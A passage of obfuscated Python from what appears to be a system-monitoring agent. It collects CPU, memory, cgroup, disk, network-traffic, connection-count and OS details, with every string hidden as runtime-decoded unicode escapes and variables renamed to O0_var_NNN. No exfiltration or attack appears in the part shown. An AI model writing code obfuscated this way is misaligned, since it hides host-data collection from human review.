O0_var_283[codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): O0_var_283[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_283[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')]}, codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0073', 'unicode_escape'): {codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): await self._get_tcp_connections(), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): await self._get_udp_connections()}, codecs.decode('\\u0075\\u0070\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): int(time.time() - psutil.boot_time()), codecs.decode('\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_286, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape')}
        Logger.debug(codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_287, indent=2)), 12)
        return O0_var_287

    def _get_cpu_name(self) -> str:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                import winreg
                O0_var_288 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, codecs.decode('\\u0048\\u0041\\u0052\\u0044\\u0057\\u0041\\u0052\\u0045\\u005c\\u0044\\u0045\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054\\u0049\\u004f\\u004e\\u005c\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u005c\\u0043\\u0065\\u006e\\u0074\\u0072\\u0061\\u006c\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u005c\\u0030', 'unicode_escape'))
                O0_var_289 = winreg.QueryValueEx(O0_var_288, codecs.decode('\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))[0]
                winreg.CloseKey(O0_var_288)
                return O0_var_289.strip()
            else:
                with open(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_290:
                    for O0_var_291 in O0_var_290:
                        if O0_var_291.strip().startswith(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u006c\\u0020\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')):
                            return O0_var_291.split(codecs.decode('\\u003a', 'unicode_escape'))[1].strip()
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u540d\\u79f0\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        return codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0043\\u0050\\u0055', 'unicode_escape')

    async def _get_cpu_usage(self) -> float:
        try:
            O0_var_292 = psutil.cpu_times()
            async with SystemInfoCollector._cpu_init_lock:
                if SystemInfoCollector._last_cpu_times is None:
                    SystemInfoCollector._last_cpu_times = O0_var_292
                    await asyncio.sleep(0.1)
                    O0_var_292 = psutil.cpu_times()
                O0_var_293 = SystemInfoCollector._last_cpu_times
                SystemInfoCollector._last_cpu_times = O0_var_292
            O0_var_294 = sum(O0_var_292) - sum(O0_var_293)
            O0_var_295 = O0_var_292.idle - O0_var_293.idle
            if O0_var_294 <= 0:
                return 0.0
            O0_var_296 = (O0_var_294 - O0_var_295) / O0_var_294 * 100
            return round(max(0.0, min(100.0, O0_var_296)), 2)
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0.0

    def _get_container_mem_limit(self) -> int:
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_297:
                    O0_var_298 = O0_var_297.read().strip()
                    if O0_var_298 != codecs.decode('\\u006d\\u0061\\u0078', 'unicode_escape'):
                        return int(O0_var_298)
        except (OSError, ValueError):
            pass
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_297:
                    O0_var_298 = int(O0_var_297.read().strip())
                    if O0_var_298 < 9223372036854771712:
                        return O0_var_298
        except (OSError, ValueError):
            pass
        return psutil.virtual_memory().total

    def _get_container_mem_usage(self) -> int:
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_299:
                    O0_var_300 = int(O0_var_299.read().strip())
                O0_var_301 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_299:
                    for O0_var_302 in O0_var_299:
                        O0_var_303 = O0_var_302.strip().split()
                        if len(O0_var_303) == 2 and O0_var_303[0] == codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'):
                            O0_var_301 = int(O0_var_303[1])
                            break
                return max(0, O0_var_300 - O0_var_301)
            except (OSError, ValueError):
                pass
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_299:
                    O0_var_300 = int(O0_var_299.read().strip())
                O0_var_304 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_299:
                    for O0_var_302 in O0_var_299:
                        O0_var_303 = O0_var_302.strip().split()
                        if len(O0_var_303) == 2 and O0_var_303[0] == codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape'):
                            O0_var_304 = int(O0_var_303[1])
                            break
                return max(0, O0_var_300 - O0_var_304)
            except (OSError, ValueError):
                pass
        return psutil.virtual_memory().used

    async def _get_memory_info(self) -> Dict[str, int]:
        try:
            O0_var_305 = self._get_container_mem_limit()
            O0_var_306 = self._get_container_mem_usage()
            O0_var_307 = psutil.swap_memory()
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_305, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_306, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_307.total, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_307.used}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u5185\\u5b58\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    def _get_physical_disk_device(self, O0_var_308: str) -> Optional[str]:
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return O0_var_308
        import re
        O0_var_309 = O0_var_308.replace(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
        if not O0_var_309:
            return None
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_309) or O0_var_309.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return O0_var_308
        O0_var_310 = [codecs.decode('\\u005e\\u0028\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0029\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006e\\u0076\\u006d\\u0065\\u005c\\u0064\\u002b\\u006e\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape')]
        for O0_var_311 in O0_var_310:
            O0_var_312 = re.match(O0_var_311, O0_var_309)
            if O0_var_312:
                return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_312.group(1))
        if not re.search(codecs.decode('\\u005c\\u0064', 'unicode_escape'), O0_var_309):
            return O0_var_308
        O0_var_313 = codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b\\u002f', 'unicode_escape') + str(O0_var_309)
        if os.path.exists(O0_var_313):
            O0_var_314 = os.path.realpath(os.path.dirname(O0_var_313))
            O0_var_315 = os.path.realpath(O0_var_313)
            if not os.path.isdir(O0_var_315):
                O0_var_316 = os.path.dirname(O0_var_314)
                if O0_var_316.endswith(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b', 'unicode_escape')):
                    O0_var_317 = os.path.basename(O0_var_314)
                    if self._is_physical_disk(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_317)):
                        return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_317)
        return None

    def _get_container_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_318 = psutil.disk_usage(codecs.decode('\\u002f', 'unicode_escape'))
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): int(O0_var_318.total), codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): int(O0_var_318.used)}
        except Exception as e:
            Logger.debug(codecs.decode('\\u005b\\u5bb9\\u5668\\u6a21\\u5f0f\\u005d\\u0020\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 15)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_host_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_319 = 0
            O0_var_320 = 0
            O0_var_321 = set()
            O0_var_322 = psutil.disk_partitions(all=True)
            for O0_var_323 in O0_var_322:
                O0_var_324 = O0_var_323.device
                O0_var_325 = O0_var_323.mountpoint
                O0_var_326 = O0_var_323.fstype
                if O0_var_326 in {codecs.decode('\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0076\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u006f\\u0076\\u0065\\u0072\\u006c\\u0061\\u0079', 'unicode_escape'), codecs.decode('\\u0073\\u0071\\u0075\\u0061\\u0073\\u0068\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0063', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), codecs.decode('\\u0062\\u0070\\u0066', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0063\\u0065\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0065\\u0066\\u0069\\u0076\\u0061\\u0072\\u0066\\u0073', 'unicode_escape')}:
                    continue
                O0_var_327 = self._get_physical_disk_device(O0_var_324)
                if not O0_var_327 or O0_var_327 in O0_var_321:
                    continue
                if not self._is_physical_disk(O0_var_327):
                    continue
                try:
                    O0_var_328 = psutil.disk_usage(O0_var_325)
                    O0_var_319 += O0_var_328.total
                    O0_var_320 += O0_var_328.used
                    O0_var_321.add(O0_var_327)
                except (PermissionError, OSError):
                    continue
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_319, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_320}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 15)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_disk_info(self, O0_var_329: Optional[str]=None) -> Dict[str, int]:
        if O0_var_329 is None:
            O0_var_329 = self._get_virtualization()
        if O0_var_329 in [codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u004c\\u0078\\u0063', 'unicode_escape'), codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')]:
            return self._get_container_disk_info()
        return await self._get_host_disk_info()

    async def _get_disk_total(self, O0_var_330: Optional[str]=None) -> int:
        O0_var_331 = await self._get_disk_info(O0_var_330)
        return O0_var_331[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')]

    def _is_physical_disk(self, O0_var_332: str) -> bool:
        if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
            return any((O0_var_332.lower().startswith(O0_var_333) for O0_var_333 in [codecs.decode('\\u0063\\u003a', 'unicode_escape'), codecs.decode('\\u0064\\u003a', 'unicode_escape'), codecs.decode('\\u0065\\u003a', 'unicode_escape'), codecs.decode('\\u0066\\u003a', 'unicode_escape'), codecs.decode('\\u0067\\u003a', 'unicode_escape'), codecs.decode('\\u0068\\u003a', 'unicode_escape')]))
        import re
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_332) or O0_var_332.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return True
        O0_var_334 = [codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0076\\u006d\\u0065\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u006e\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u007a\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u002a\\u0024', 'unicode_escape')]
        return any((re.match(O0_var_335, O0_var_332) for O0_var_335 in O0_var_334))

    async def _get_network_stats(self) -> Dict[str, int]:
        try:
            O0_var_336 = psutil.net_io_counters(pernic=True)
            O0_var_337 = time.time()
            O0_var_338 = 0
            O0_var_339 = 0
            O0_var_340 = [codecs.decode('\\u006c\\u006f', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0062\\u0072\\u002d', 'unicode_escape'), codecs.decode('\\u0074\\u0075\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0069\\u0072\\u0062\\u0072', 'unicode_escape')]
            for O0_var_341, O0_var_342 in O0_var_336.items():
                if any((O0_var_343 in O0_var_341 for O0_var_343 in O0_var_340)):
                    continue
                O0_var_338 += O0_var_342.bytes_recv
                O0_var_339 += O0_var_342.bytes_sent
            if SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')] == 0:
                SystemInfoCollector._total_network_down = O0_var_338
                SystemInfoCollector._total_network_up = O0_var_339
                SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_338, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_339}
                SystemInfoCollector._last_network_time = O0_var_337
                return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
            O0_var_344 = O0_var_337 - SystemInfoCollector._last_network_time
            O0_var_345 = 0
            O0_var_346 = 0
            if O0_var_344 > 0:
                O0_var_346 = (O0_var_338 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')]) / O0_var_344
                O0_var_345 = (O0_var_339 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0074\\u0078', 'unicode_escape')]) / O0_var_344
                O0_var_346 = max(0, O0_var_346)
                O0_var_345 = max(0, O0_var_345)
                SystemInfoCollector._total_network_down = O0_var_338
                SystemInfoCollector._total_network_up = O0_var_339
            SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_338, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_339}
            SystemInfoCollector._last_network_time = O0_var_337
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): int(O0_var_345), codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): int(O0_var_346), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
        except Exception as e:
            Logger.debug(codecs.decode('\\u0070\\u0073\\u0075\\u0074\\u0069\\u006c\\u0020\\u6309\\u7f51\\u5361\\u7edf\\u8ba1\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 14)
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0}

    async def _get_tcp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_347 = await asyncio.to_thread(subprocess.run, [codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_348 for O0_var_348 in O0_var_347.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape') in O0_var_348])
            O0_var_349 = psutil.net_connections(kind=codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'))
            return len([O0_var_350 for O0_var_350 in O0_var_349 if O0_var_350.status == codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape')])
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0054\\u0043\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0

    async def _get_udp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_351 = await asyncio.to_thread(subprocess.run, [codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_352 for O0_var_352 in O0_var_351.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0055\\u0044\\u0050', 'unicode_escape') in O0_var_352 and O0_var_352.strip()])
            return len(psutil.net_connections(kind=codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')))
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0055\\u0044\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0

    def _get_linux_distribution(self) -> Dict[str, str]:
        try:
            if platform.system() == codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape') and os.path.exists(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_353:
                    O0_var_354 = O0_var_353.read()
                O0_var_355, O0_var_356 = (codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'))
                for O0_var_357 in O0_var_354.split(codecs.decode('\\u000a', 'unicode_escape')):
                    if O0_var_357.startswith(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_355 = O0_var_357.replace(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
